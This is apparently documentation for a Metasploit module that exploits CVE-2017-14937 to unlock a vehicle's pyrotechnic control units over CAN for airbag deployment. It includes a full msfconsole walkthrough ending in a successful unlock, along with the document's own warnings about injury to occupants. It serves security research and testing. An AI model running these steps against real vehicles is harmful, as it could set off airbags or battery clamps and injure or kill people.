Acting in the role of a Pyrotechnical Device Deployment Tool (PDT), this module will first query all Pyrotechnic Control Units (PCUs) in the target vehicle to discover how many pyrotechnic devices are present, then attempt to validate the security access token using the default simplified algorithm.  On success, the vehicle will be in a state that is prepped to deploy its pyrotechnic devices (e.g. airbags, battery clamps, etc.) via the service routine. (ISO 26021)

This module is based on research by Johannes Braun and Juergen Duerrwang, which you can read more about [here](https://www.researchgate.net/publication/321183727_Security_Evaluation_of_an_Airbag-ECU_by_Reusing_Threat_Modeling_Artefacts) along with related [CVE-2017-14937](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14937).

## Options

  **SRCID**

  This is the SRC CAN ID for the PCU connection.  Default is 0x7F1.

  **DSTID**

  This is the CAN ID of the expected response.  Default is 0x7F9.

  **CANBUS**

  Determines which CAN bus to communicate on.  Type 'supported_buses' for valid options.

  **PADDING**

  Optional byte-value to use for padding all CAN bus packets to an 8-byte length.  Padding is disabled by default.

## Scenarios

  A successful unlock and prepped-to-deploy of pyrotechnic devices in a target vehicle:

```
$ ./msfconsole -q
msf > use auxiliary/server/local_hwbridge
msf auxiliary(local_hwbridge) > set uripath /
uripath => /
msf auxiliary(local_hwbridge) > run
[*] Auxiliary module running as background job 0.

[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://10.0.2.4:8080/
[*] Server started.

msf auxiliary(local_hwbridge) > use auxiliary/client/hwbridge/connect
msf auxiliary(connect) > run

[*] Attempting to connect to 127.0.0.1...
[*] Hardware bridge interface session 1 opened (127.0.0.1 -> 127.0.0.1) at 2017-12-17 10:41:27 -0600
[+] HWBridge session established
[*] HW Specialty: {"automotive"=>true}  Capabilities: {"can"=>true, "custom_methods"=>true}
[!] NOTICE:  You are about to leave the matrix.  All actions performed on this hardware bridge
[!]          could have real world consequences.  Use this module in a controlled testing
[!]          environment and with equipment you are authorized to perform testing on.
[*] Auxiliary module execution completed

msf auxiliary(connect) > sessions -i 1
[*] Starting interaction with 1...

hwbridge >
hwbridge > run post/hardware/automotive/pdt canbus=<target CAN bus>

[*] Gathering Data...
[*]  VIN: 5555
[*] Loop info (1 pyrotechnic devices):
[*]   69 | battery clamp main battery
[*]      |  Deployment Status: Fail ()
[*]  Number of PCUs in vehicle     | 1
[*]  Info About First PCU
[*]  Address format this PCU(s)    | 11 bit normal addressing
[*]  Number of pyrotechnic charges | 1
[*]  Version of ISO26021 standard  | 1
[*]  ACL type                      | CAN only
[*]  ACL Type version              | 1
[*]
[*] Switching to Diagnostic Session 0x04...
[*] Getting Security Access Seed...
[*] Success.  Seed: ["01", "CF", "00", "00", "00"]
[*] Attempting to unlock device...
[*] Success!
[!] Warning! You are now able to start the deployment of airbags in this vehicle
[!] *** OCCUPANTS OF THE VEHICLE FACE POTENTIAL DEATH OR INJURY ***
```
